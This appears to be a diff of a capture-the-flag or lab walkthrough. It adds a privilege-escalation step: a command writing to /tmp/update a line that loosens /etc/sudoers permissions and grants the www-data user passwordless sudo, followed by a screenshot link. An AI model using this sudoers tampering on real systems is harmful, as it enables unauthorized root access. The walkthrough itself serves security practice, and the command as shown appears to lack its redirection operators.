@@ -112,5 +112,9 @@ We see that the version is 0.49
 
 We found the appropriate exploit.
 
+Finally, after running the code below, we become root.
+
+<code>echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD: ALL"  /etc/sudoers && chmod 440 /etc/sudoers'  /tmp/update</code>
 
 
+![16](https://user-images.githubusercontent.com/32979760/124590915-5939fb00-de64-11eb-92ae-919ab8252f7f.png)
